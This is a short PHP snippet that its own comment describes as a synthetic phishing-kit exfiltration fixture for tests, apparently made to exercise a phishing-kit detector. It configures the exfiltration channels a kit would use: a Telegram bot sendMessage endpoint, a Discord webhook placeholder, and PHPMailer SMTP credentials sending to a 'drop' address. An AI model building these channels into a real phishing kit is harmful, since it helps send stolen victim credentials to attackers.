<?php
// SYNTHETIC phishing-kit exfiltration snippet for tests (<<NAME>> placeholders filled at test time)
$token = "<<TG>>";
$chat_id = "-1001234567890";
$api = "https://api.telegram.org/bot" . $token . "/sendMessage";
$hook = "<<DISCORD>>";
$mail = new PHPMailer(true);
$mail->Host = 'smtp.example.net';
$mail->Username = 'kit@example.net';
$mail->Password = '<<SMTP_PW>>';
$to = 'drop@example.org';
?>
